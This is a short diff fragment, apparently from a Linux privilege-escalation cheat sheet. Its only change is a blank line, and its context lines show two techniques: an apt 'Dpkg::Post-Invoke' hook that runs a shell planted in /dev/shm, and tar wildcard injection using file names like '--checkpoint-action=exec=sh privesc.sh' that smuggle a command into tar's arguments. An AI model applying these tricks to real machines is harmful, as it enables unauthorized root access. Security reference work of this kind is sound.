@@ -681,6 +681,7 @@ echo 'Dpkg::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
 ```bash
 tar cf /blah/bla *
 tar xvf /blah/bla *
+
 # 1. Create files in the current directory called
 # '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'
 
